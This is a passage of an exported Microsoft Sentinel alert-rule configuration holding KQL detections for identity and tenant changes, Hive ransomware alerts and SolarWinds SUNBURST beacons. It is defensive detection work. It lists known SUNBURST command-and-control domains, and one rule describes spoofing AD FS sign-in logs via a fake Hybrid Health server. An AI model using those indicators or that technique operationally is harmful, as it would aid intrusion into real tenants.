=~ \"b2bDirectConnectInbound\"\n      | extend PremodifiedInboundSettings = trim('\"',tostring(Property.oldValue)),\n               ModifiedInboundSettings = trim(@'\"',tostring(Property.newValue))\n  )\n| where PremodifiedInboundSettings != ModifiedInboundSettings\n| extend InitiatingAppName = tostring(InitiatedBy.app.displayName)\n| extend InitiatingAppServicePrincipalId = tostring(InitiatedBy.app.servicePrincipalId)\n| extend InitiatingUserPrincipalName = tostring(InitiatedBy.user.userPrincipalName)\n| extend InitiatingAadUserId = tostring(InitiatedBy.user.id)\n| extend InitiatingIpAddress = tostring(iff(isnotempty(InitiatedBy.user.ipAddress), InitiatedBy.user.ipAddress, InitiatedBy.app.ipAddress))\n| extend InitiatingAccountName = tostring(split(InitiatingUserPrincipalName, \"@\")[0]), InitiatingAccountUPNSuffix = tostring(split(InitiatingUserPrincipalName, \"@\")[1])\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"InitiatingAppName"},{"identifier":"AadUserId","columnName":"InitiatingAppServicePrincipalId"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"InitiatingUserPrincipalName"},{"identifier":"Name","columnName":"InitiatingAccountName"},{"identifier":"UPNSuffix","columnName":"InitiatingAccountUPNSuffix"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"InitiatingAadUserId"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"InitiatingIpAddress"}]}],"templateVersion":"1.1.1","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess","Persistence","Discovery"],"techniques":["T1078","T1136","T1087"],"displayName":"Cross-tenant Access Settings Organization Inbound Direct Settings Changed","enabled":true,"description":"Organizations are added in the Cross-tenant Access Settings to control communication inbound or outbound for users and applications. This detection notifies when Organization Inbound Direct Settings are changed for \"Users & Groups\" and for \"Applications\".","alertRuleTemplateName":"276d5190-38de-4eb2-9933-b3b72f4a5737","lastModifiedUtc":"2024-07-18T20:14:14.2328412Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/687be782-8915-4d6f-b417-8e9700f6dc42","name":"687be782-8915-4d6f-b417-8e9700f6dc42","etag":"\"8800d41d-0000-2700-0000-66fdceb00000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"AzureActivity\n| where CategoryValue =~ 'Administrative'\n| where ResourceProviderValue =~ 'Microsoft.ADHybridHealthService'\n| where _ResourceId has 'AdFederationService'\n| where OperationNameValue =~ 'Microsoft.ADHybridHealthService/services/servicemembers/action'\n| extend claimsJson = parse_json(Claims)\n| extend AppId = tostring(claimsJson.appid), AccountName = tostring(claimsJson.name), Name = tostring(split(Caller,'@',0)[0]), UPNSuffix = tostring(split(Caller,'@',1)[0])\n| project-away claimsJson\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"Caller"},{"identifier":"Name","columnName":"Name"},{"identifier":"UPNSuffix","columnName":"UPNSuffix"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"CallerIpAddress"}]}],"templateVersion":"2.0.3","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion"],"techniques":["T1578"],"displayName":"Microsoft Entra ID Hybrid Health AD FS New Server","enabled":true,"description":"This detection uses AzureActivity logs (Administrative category) to identify the creation or update of a server instance in an Microsoft Entra ID Hybrid Health AD FS service.\nA threat actor can create a new AD Health ADFS service and create a fake server instance to spoof AD FS signing logs. There is no need to compromise an on-premises AD FS server.\nThis can be done programmatically via HTTP requests to Azure. More information in this blog: https://o365blog.com/post/hybridhealthagent/\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows\nMITRE:TA0003;T1136;T1136.003,TA0006;T1606;T1606.002","alertRuleTemplateName":"88f453ff-7b9e-45bb-8c12-4058ca5e44ee","lastModifiedUtc":"2024-10-02T22:52:31.0603514Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/deb7c7e9-fff8-45ee-bb63-385563de1835","name":"deb7c7e9-fff8-45ee-bb63-385563de1835","etag":"\"88002628-0000-2700-0000-66fdcf5c0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"let Hive_threats = dynamic([\"Ransom:Win64/Hive\", \"Ransom:Win32/Hive\"]);\nDeviceInfo\n| extend DeviceName = tolower(DeviceName)\n| join kind=inner ( SecurityAlert\n| where ProviderName == \"MDATP\"\n| extend ThreatName = tostring(parse_json(ExtendedProperties).ThreatName)\n| extend ThreatFamilyName = tostring(parse_json(ExtendedProperties).ThreatFamilyName)\n| where ThreatName in~ (Hive_threats) or ThreatFamilyName in~ (Hive_threats)\n| extend CompromisedEntity = tolower(CompromisedEntity)\n) on $left.DeviceName == $right.CompromisedEntity\n| summarize by DisplayName, ThreatName, ThreatFamilyName, PublicIP, AlertSeverity, Description, tostring(LoggedOnUsers), DeviceId, TenantId , bin(TimeGenerated, 1d), CompromisedEntity, tostring(LoggedOnUsers), ProductName, Entities","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"CompromisedEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"PublicIP"}]}],"templateVersion":"1.0.2","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess","Execution","Persistence","PrivilegeEscalation","DefenseEvasion","CredentialAccess","Discovery","LateralMovement","CommandAndControl","Impact"],"techniques":["T1190","T1204","T1136","T1078","T1140","T1070","T1003","T1018","T1021","T1071","T1486"],"displayName":"AV detections related to Hive Ransomware","enabled":true,"description":"This query looks for Microsoft Defender AV detections related to Hive Ransomware . In Microsoft Sentinel the SecurityAlerts table includes only the Device Name of the affected device,\nthis query joins the DeviceInfo table to clearly connect other information such as Device group, ip, logged on users etc. This would allow the Microsoft Sentinel analyst to have more context related to the alert, if available. https://www.microsoft.com/en-us/security/blog/2022/07/05/hive-ransomware-gets-upgrades-in-rust/                                                                                The impact of these updates is far-reaching, considering that Hive is a RaaS payload that Microsoft has observed in attacks against organizations in the healthcare and software industries by large ransomware affiliates like DEV-0237.\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows\nMITRE:TA0001;T1190,TA0003;T1078;T1078.004;T1136;T1136.003,TA0004;T1078;T1078.004,TA0008;T1021,TA0040;T1486","alertRuleTemplateName":"4e5914a4-2ccd-429d-a845-fa597f0bd8c5","lastModifiedUtc":"2024-10-02T22:55:23.5213943Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/0e8cd6ce-c373-4622-9d9f-0d209d7b495b","name":"0e8cd6ce-c373-4622-9d9f-0d209d7b495b","etag":"\"e1003997-0000-2700-0000-65deed980000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P7D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let admins=(IdentityInfo\n  | where AssignedRoles contains \"admin\"\n  | summarize by tolower(AccountUPN));\n  let known_asns = (\n  SigninLogs\n  | where TimeGenerated between(ago(14d)..ago(1d))\n  | where ResultType == 0\n  | summarize by AutonomousSystemNumber);\n  SigninLogs\n  | where TimeGenerated > ago(1d)\n  | where ResultType == 0\n  | where tolower(UserPrincipalName) in (admins)\n  | where AutonomousSystemNumber !in (known_asns)\n  | project-reorder TimeGenerated, UserPrincipalName, UserAgent, IPAddress, AutonomousSystemNumber\n  | extend AccountCustomEntity = UserPrincipalName, IPCustomEntity = IPAddress","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]}],"templateVersion":"1.0.4","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion"],"techniques":["T1078"],"displayName":"Privileged User Logon from new ASN","enabled":true,"description":"Detects a successful logon by a privileged account from an ASN not logged in from in the last 14 days.\n  Monitor these logons to ensure they are legitimate and identify if there are any similar sign ins.","alertRuleTemplateName":"55073036-bb86-47d3-a85a-b113ac3d9396","lastModifiedUtc":"2023-07-03T15:46:33.1442552Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/0e5aa379-690b-4949-a6c4-6429f8717918","name":"0e5aa379-690b-4949-a6c4-6429f8717918","etag":"\"a101a05d-0000-2700-0000-654d02110000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"let mde_threats = dynamic([\"Behavior:Win32/SuspAzureRequest.A\", \"Behavior:Win32/SuspAzureRequest.B\", \"Behavior:Win32/SuspAzureRequest.C\", \"Behavior:Win32/LaunchingSuspCMD.B\"]);\nDeviceInfo\n| extend DeviceName = tolower(DeviceName)\n| join kind=inner ( SecurityAlert\n| where ProviderName == \"MDATP\"\n| extend ThreatName = tostring(parse_json(ExtendedProperties).ThreatName)\n| extend ThreatFamilyName = tostring(parse_json(ExtendedProperties).ThreatFamilyName)\n| where ThreatName in~ (mde_threats) or ThreatFamilyName in~ (mde_threats)\n| extend CompromisedEntity = tolower(CompromisedEntity)\n) on $left.DeviceName == $right.CompromisedEntity\n| summarize by DisplayName, ThreatName, ThreatFamilyName, PublicIP, AlertSeverity, Description, tostring(LoggedOnUsers), DeviceId, TenantId , bin(TimeGenerated, 1d), CompromisedEntity, tostring(LoggedOnUsers), ProductName, Entities","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"CompromisedEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"PublicIP"}]}],"templateVersion":"1.0.3","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Execution","CommandAndControl"],"techniques":["T1204","T1059","T1071"],"displayName":"Microsoft Defender for Endpoint (MDE) signatures for Azure Synapse pipelines and Azure Data Factory","enabled":true,"description":"This query looks for Microsoft Defender for Endpoint detections related to the remote command execution attempts on Azure IR with Managed VNet or SHIR. \nIn Microsoft Sentinel, the SecurityAlerts table includes the name of the impacted device. Additionally, this query joins the DeviceInfo table to connect other information such as device group, \nIP address, signed in users, and others allowing analysts using Microsoft Sentinel to have more context related to the alert. \nReference: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-29972 , \nhttps://msrc-blog.microsoft.com/2022/05/09/vulnerability-mitigated-in-the-third-party-data-connector-used-in-azure-synapse-pipelines-and-azure-data-factory-cve-2022-29972\n\nExecution, Command and Control, Discovery\nT1204- User Execution:T1204.002, T1059- Command and Scripting Interpreter:T1059.001,T1059.003, T1071: Application Layer Protocol","alertRuleTemplateName":"a333d8bf-22a3-4c55-a1e9-5f0a135c0253","lastModifiedUtc":"2023-11-09T16:00:16.5654107Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/aed4e656-6b9b-49bb-87ad-894c5eb0d0a9","name":"aed4e656-6b9b-49bb-87ad-894c5eb0d0a9","etag":"\"8700ed70-0000-2700-0000-66fdc34d0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT2H","queryPeriod":"PT2H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"let AdminRecords = AuditLogs\n| where Category =~ \"RoleManagement\"\n| where ActivityDisplayName has_any (\"Add eligible member to role\", \"Add member to role\")\n| mv-apply TargetResource = TargetResources on \n  (\n      where TargetResource.type =~ \"User\"\n      | extend TargetUserPrincipalName = tostring(TargetResource.userPrincipalName),\n               props = TargetResource.modifiedProperties\n  )\n| mv-apply Property = props on \n  (\n      where Property.displayName =~ \"Role.DisplayName\"\n      | extend RoleName = trim('\"',tostring(Property.newValue))\n  )\n| where RoleName contains \"Admin\";\nAdminRecords\n| summarize dcount(TargetUserPrincipalName) by bin(TimeGenerated, 1h)\n| where dcount_TargetUserPrincipalName > 9\n| join kind=rightsemi  (\n  AdminRecords\n  | extend TimeWindow = bin(TimeGenerated, 1h)\n) on $left.TimeGenerated == $right.TimeWindow\n| extend InitiatedByUser = iff(isnotempty(InitiatedBy.user.userPrincipalName), tostring(InitiatedBy.user.userPrincipalName), \"\")\n| extend InitiatingAppName = tostring(InitiatedBy.app.displayName)\n| extend InitiatingAppServicePrincipalId = tostring(InitiatedBy.app.servicePrincipalId)\n| extend InitiatingUserPrincipalName = tostring(InitiatedBy.user.userPrincipalName)\n| extend InitiatingAadUserId = tostring(InitiatedBy.user.id)\n| extend InitiatingIpAddress = tostring(iff(isnotempty(InitiatedBy.user.ipAddress), InitiatedBy.user.ipAddress, InitiatedBy.app.ipAddress))\n| extend TargetName = tostring(split(TargetUserPrincipalName,'@',0)[0]), TargetUPNSuffix = tostring(split(TargetUserPrincipalName,'@',1)[0])\n| extend InitiatingAccountName = tostring(split(InitiatingUserPrincipalName, \"@\")[0]), InitiatingAccountUPNSuffix = tostring(split(InitiatingUserPrincipalName, \"@\")[1])\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":true,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"customDetails":{"TargetUser":"TargetUserPrincipalName","InitiatedByUser":"InitiatedByUser"},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"InitiatingAppName"},{"identifier":"AadUserId","columnName":"InitiatingAppServicePrincipalId"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"TargetUserPrincipalName"},{"identifier":"Name","columnName":"TargetName"},{"identifier":"UPNSuffix","columnName":"TargetUPNSuffix"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"InitiatingUserPrincipalName"},{"identifier":"Name","columnName":"InitiatingAccountName"},{"identifier":"UPNSuffix","columnName":"InitiatingAccountUPNSuffix"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"InitiatingAadUserId"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"InitiatingIpAddress"}]}],"templateVersion":"1.0.7","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["PrivilegeEscalation"],"techniques":["T1078"],"displayName":"Bulk Changes to Privileged Account Permissions","enabled":true,"description":"Identifies when changes to multiple users permissions are changed at once. Investigate immediately if not a planned change. This setting could enable an attacker access to Azure subscriptions in your environment.\nRef : https://docs.microsoft.com/azure/active-directory/fundamentals/security-operations-privileged-identity-management\nPLATFORM:Azure AD,Microsoft 365,IaaS\nMITRE:TA0003;T1078;T1078.004","alertRuleTemplateName":"218f60de-c269-457a-b882-9966632b9dc6","lastModifiedUtc":"2024-10-02T22:03:56.3814334Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/719ef6bf-db3c-465a-bd35-c48dc6835c73","name":"719ef6bf-db3c-465a-bd35-c48dc6835c73","etag":"\"8700c742-0000-2700-0000-66fdc0240000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"AuditLogs \n| where OperationName contains \"Update user\"\n| where TargetResources[0].modifiedProperties[0].oldValue contains \"Guest\"\n| extend InvitedUser = TargetResources[0].userPrincipalName\n// alerts for changed usertype from specific domains or users\n| where InvitedUser has_any (\"CUSTOM DOMAIN NAME#\", \"#EXT#\")\n| extend InitiatedByActionUserInformation = iff(isnotempty(InitiatedBy.user.userPrincipalName), InitiatedBy.user.userPrincipalName, InitiatedBy.app.displayName)\n| extend InitiatedByIPAdress = InitiatedBy.user.ipAddress \n| extend OldUserType = TargetResources[0].modifiedProperties[0].oldValue contains \"Guest\"\n| extend NewUserType = TargetResources[0].modifiedProperties[0].newValue contains \"Member\"\n| mv-expand OldUserType = TargetResources[0].modifiedProperties[0].oldValue to typeof(string)\n| mv-expand NewUserType = TargetResources[0].modifiedProperties[0].newValue to typeof(string)\n| where OldUserType != NewUserType","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"InvitedUser"}]},{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"InitiatedByActionUserInformation"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"InitiatedByIPAdress"}]}],"templateVersion":"1.0.0","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess","Persistence","Discovery"],"techniques":["T1078","T1136","T1087"],"displayName":"Guest accounts changed user type from guest to members in AzureAD","enabled":true,"description":"Guest Accounts are added in the Organization Tenants to perform various tasks i.e projects execution, support etc.. This detection notifies when guest users are changed from user type as should be in AzureAD to member and gain other rights in the tenant.\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows\nMITRE:TA0003;T1136;T1136.003,TA0004;T1078;T1078.001;T1078.002;T1078.003;T1078.004,TA0007;T1087;T1087.004","alertRuleTemplateName":"639aa695-9de9-4921-aa6b-6fdc35cb1eee","lastModifiedUtc":"2024-10-02T21:50:25.5694387Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/a1b63da5-abae-43c7-846b-4824dcc7c0d2","name":"a1b63da5-abae-43c7-846b-4824dcc7c0d2","etag":"\"e1003c97-0000-2700-0000-65deed990000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Low","query":"AuditLogs\n  | where Category =~ \"ApplicationManagement\"\n  | where OperationName has_any (\"Update Application\", \"Update Service principal\")\n  | extend appName = tostring(parse_json(tostring(InitiatedBy.app)).displayName)\n  | extend UPN = tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName)\n  | extend UpdatedBy = iif(isnotempty(appName), appName, UPN)\n  | extend mod_props = TargetResources[0].modifiedProperties\n  | extend AppName = tostring(TargetResources[0].displayName)\n  | mv-expand mod_props\n  | extend Action = tostring(mod_props.displayName)\n  | where Action contains \"Url\"\n  | extend OldURL = tostring(mod_props.oldValue)\n  | extend NewURL = tostring(mod_props.newValue)\n  | project-reorder TimeGenerated, OperationName, Action, AppName, OldURL, NewURL, UpdatedBy","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UpdatedBy"}]},{"entityType":"URL","fieldMappings":[{"identifier":"Url","columnName":"OldURL"}]},{"entityType":"URL","fieldMappings":[{"identifier":"Url","columnName":"NewURL"}]}],"templateVersion":"1.0.1","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence","PrivilegeEscalation"],"techniques":["T1078"],"displayName":"Changes to Application Logout URL","enabled":true,"description":"Detects changes to an applications sign out URL.\n  Look for any modifications to a sign out URL. Blank entries or entries to non-existent locations would stop a user from terminating a session.\n  Ref: https://docs.microsoft.com/azure/active-directory/fundamentals/security-operations-applications#logout-url-modified-or-removed","alertRuleTemplateName":"492fbe35-cbac-4a8c-9059-826782e6915a","lastModifiedUtc":"2023-07-03T16:27:08.9051846Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/fbcbe2c3-7cb2-43a2-b386-2321db958c99","name":"fbcbe2c3-7cb2-43a2-b386-2321db958c99","etag":"\"86000e72-0000-2700-0000-66fdb3900000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let SunburstURL=dynamic([\"panhardware.com\",\"databasegalore.com\",\"avsvmcloud.com\",\"freescanonline.com\",\"thedoccloud.com\",\"deftsecurity.com\"]);\nDeviceNetworkEvents\n| where ActionType == \"ConnectionSuccess\"\n| where RemoteUrl in(SunburstURL)\n| extend HashAlgorithm = 'MD5'\n| extend HostName = tostring(split(DeviceName, \".\")[0]), DomainIndex = toint(indexof(DeviceName, '.'))\n| extend HostNameDomain = iff(DomainIndex != -1, substring(DeviceName, DomainIndex + 1), DeviceName)\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"DeviceName"},{"identifier":"HostName","columnName":"HostName"},{"identifier":"DnsDomain","columnName":"HostNameDomain"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"InitiatingProcessAccountUpn"},{"identifier":"Name","columnName":"InitiatingProcessAccountName"},{"identifier":"UPNSuffix","columnName":"InitiatingProcessAccountDomain"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"RemoteIP"}]},{"entityType":"URL","fieldMappings":[{"identifier":"Url","columnName":"RemoteUrl"}]},{"entityType":"FileHash","fieldMappings":[{"identifier":"Algorithm","columnName":"HashAlgorithm"},{"identifier":"Value","columnName":"InitiatingProcessMD5"}]}],"templateVersion":"1.0.5","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Execution","Persistence","InitialAccess"],"techniques":["T1195","T1059","T1546"],"displayName":"SUNBURST network beacons","enabled":true,"description":"Identifies SolarWinds SUNBURST domain beacon IOCs in DeviceNetworkEvents\nReferences:\n- https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html\n- https://gist.github.com/olafhartong/71ffdd4cab4b6acd5cbcd1a0691ff82f\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows\nMITRE:TA0001;T1195,TA0002;T1059,TA0003;T1546","alertRuleTemplateName":"ce1e7025-866c-41f3-9b08-ec170e05e73e","lastModifiedUtc":"2024-10-02T20:56:47.9057035Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/b8375f86-8b86-4719-a8d6-3d0d7e6d3de5","name":"b8375f86-8b86-4719-a8d6-3d0d7e6d3de5","etag":"\"87000413-0000-2700-0000-66fdbd010000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"// Administrative roles to look for, default is all admin roles\nlet roles = dynamic([\"Administrator\", \"Admin\"]);\n// The maximum distances between and invite and acceptance\nlet maxTimeBetweenInviteAccept = 30min;\n// The delta (minutes) between the invite being sent and the account being escalated\nlet deltaBetweenInviteEscalation = 60;\n// Collect external user invitations\nlet invite = AuditLogs\n| where Category =~ \"UserManagement\"\n| where OperationName =~ \"Invite external user\"\n| extend Target = tostring(TargetResources[0].[\"userPrincipalName\"])\n| extend InviteInitiator = tostring(InitiatedBy.[\"user\"].[\"userPrincipalName\"])\n| where isnotempty(InviteInitiator);\n// Collect redeem events\nlet redeem = AuditLogs\n| where Category =~ \"UserManagement\"\n| where OperationName =~ \"Redeem external user invite\"\n| where Result =~ \"success\"\n| extend Target = tostring(TargetResources[0].[\"displayName\"]) | extend Target = tostring(extract(@\"UPN\\:\\s(.+)\\,\\sEmail\",1,Target))\n| where isnotempty(Target);\n// Union the inivtation and redeem data then run the sequence_detect kusto plugin\ninvite\n| union redeem\n| order by TimeGenerated\n| project TimeGenerated, Target, InviteInitiator, OperationName, TenantId\n| evaluate sequence_detect(TimeGenerated, maxTimeBetweenInviteAccept, maxTimeBetweenInviteAccept, invite=(OperationName has \"Invite external user\"), redeem=(OperationName has \"Redeem external user invite\"), Target)\n| join kind=innerunique (\nAuditLogs\n| where Category =~ \"RoleManagement\"\n| where AADOperationType in~ (\"Assign\", \"AssignEligibleRole\")\n| where ActivityDisplayName has_any (\"Add eligible member to role\", \"Add member to role\")\n| mv-expand TargetResources\n// Limit to external accounts\n| where TargetResources.userPrincipalName has \"EXT\"\n| mv-expand TargetResources.modifiedProperties\n| extend displayName_ = tostring(TargetResources_modifiedProperties.displayName)\n| where displayName_ =~ \"Role.DisplayName\"\n| extend RoleName = tostring(parse_json(tostring(TargetResources_modifiedProperties.newValue)))\n// Perform check for admin roles\n| where RoleName has_any(roles)\n| extend InitiatingApp = tostring(parse_json(tostring(InitiatedBy.app)).displayName)\n| extend Initiator = iif(isnotempty(InitiatingApp), InitiatingApp, tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName))\n| where Initiator != \"MS-PIM\"\n| extend Target = tostring(TargetResources.userPrincipalName)\n| summarize by TimeGenerated, OperationName,  RoleName, Target, Initiator, Result\n) on Target\n// Calculate delta between the invite and the account escalation\n| extend delta = datetime_diff(\"minute\", TimeGenerated, invite_TimeGenerated)\n| where delta <= deltaBetweenInviteEscalation\n| project InvitationTime=invite_TimeGenerated, RedeemTime=redeem_TimeGenerated, GrantTime=TimeGenerated, ExternalUser=Target, RoleGranted=RoleName, AdminInitiator=Initiator, MinsBetweenInviteAndEscalation=delta\n| extend ExternalUserName = tostring(split(ExternalUser, '@', 0)[0]), ExternalUserUPNSuffix = tostring(split(ExternalUser, '@', 1)[0])\n| extend AdminInitiatorName = tostring(split(AdminInitiator, '@', 0)[0]), AdminInitiatorUPNSuffix = tostring(split(AdminInitiator, '@', 1)[0])","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"ExternalUserName"},{"identifier":"UPNSuffix","columnName":"ExternalUserUPNSuffix"}]},{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"AdminInitiatorName"},{"identifier":"UPNSuffix","columnName":"AdminInitiatorUPNSuffix"}]}],"templateVersion":"1.0.1","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence"],"techniques":["T1098"],"displayName":"New External User Granted Admin Role","enabled":true,"description":"This query will detect 